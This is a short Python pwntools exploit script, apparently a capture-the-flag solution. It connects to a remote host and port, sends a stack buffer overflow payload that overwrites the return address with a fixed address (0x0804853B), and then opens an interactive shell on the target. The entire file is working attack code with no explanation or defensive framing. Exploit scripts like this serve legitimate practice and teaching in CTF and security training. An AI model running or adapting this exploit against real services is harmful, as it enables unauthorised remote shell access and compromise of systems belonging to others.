#!/usr/bin/python2.7
#coding:utf-8
# eg: python exp.py 192.168.8.101 8888 
from sys import *
from pwn import *

host = argv[1]
port = int(argv[2])
timeout = 30

context.log_level = 'debug'

def getIO():
    return remote(host, port, timeout=timeout)

def getshell():
        p=getIO()
        p.sendline('a'*0x18+p32(0)+p32(0x0804853B))
        p.interactive()

if __name__ == '__main__':
    print(getshell())
